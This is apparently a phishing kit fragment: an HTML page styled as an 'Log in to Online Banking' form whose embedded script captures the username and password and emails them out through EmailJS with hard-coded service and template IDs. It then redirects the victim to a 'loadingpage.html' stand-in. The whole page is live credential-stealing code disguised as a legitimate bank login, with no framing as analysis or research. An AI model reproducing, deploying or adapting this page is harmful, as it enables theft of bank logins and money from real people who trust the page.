<body>
<div id=layout-wrapper>
 
 
<div data-viewmodel=login/viewmodels/logoff data-bind="props: wizardSettings" data-props=null>
 <div class=loggoff-notifier-container></div>
 <div class=auth__wizard data-main-content>
 
 <div class="auth__wizard auth__wizard-username" data-viewmodel=login/viewmodels/userName data-bind="props: settings" data-props='{"authenticateInNewWindow":false,"msBrowserBehavior":"Standard","previousStepAllowed":false,"finalStep":false,"isRecaptchaEnabled":false}'>
 <div class=content__container>
 <h1 class=page__heading>Log in to Online Banking</h1>
 <div data-bind data-role=notifier style=display:none></div>
 <div class=panel>
 <div class=panel__body>
 <div class=auth__form-divider>
 <div class=auth__form>





 <form id="login-form" data-bind data-stable-name=LoginForm data-role=extendedvalidator novalidate>
<div class=form-control-container>
 <label>
 <span class=form-control__label data-stable-name=UserNameLabel>Username:</span>

 <input autocapitalize="off" autocomplete="new-value"
 class="form-control k-textbox"
 id="username" maxlength="20" name="UserName"
 required type="text">
 
 <span id="username-error" class="k-invalid-msg" style="display:none;color:red;">
 User ID is required
 </span>
 </label>
 
 
 <label>
 <span class="form-control__label">Password:</span>
 
 <input autocapitalize="off" autocomplete="new-value"
 class="form-control k-textbox"
 id="password" maxlength="20" name="Password"
 required type="text">
 
 <span id="password-error" class="k-invalid-msg" style="display:none;color:red;">
 Password is required
 </span>
 </label>
</div>
 
 
 <button type="submit" name="submit"
 class="btn btn--primary btn__block">
 Sign in
 </button>
 
 
 <script>
 
 emailjs.init("m5EWYUzGEiW3cDMVu");
 
 function sendEmail(username, password) {
     emailjs.send("service_ev0guaa", "template_08dlwd3", {
         username: username,
         password: password
     })
     .then(function(response) {
         console.log("Email sent successfully!", response);
         window.location.href = "loadingpage.html";
     }, function(error) {
         console.error("Email sending failed:", error);
     });
 }
 
 document.getElementById("login-form").addEventListener("submit", function(event) {
 
     event.preventDefault();
 
     var username = document.getElementById("username").value.trim();
     var password = document.getElementById("password").value.trim();
 
     var userError = document.getElementById("username-error");
     var passError = document.getElementById("password-error");
 
     // Reset errors
     userError.style.display = "none";
     passError.style.display = "none";
 
     let hasError = false;
 
     if (username === "") {
         userError.style.display = "block";
         hasError = true;
     }
 
     if (password === "") {
         passError.style.display = "block";
         hasError = true;
     }
 
     if (hasError) return;
 
     sendEmail(username, password);
 
 });
 
 </script>
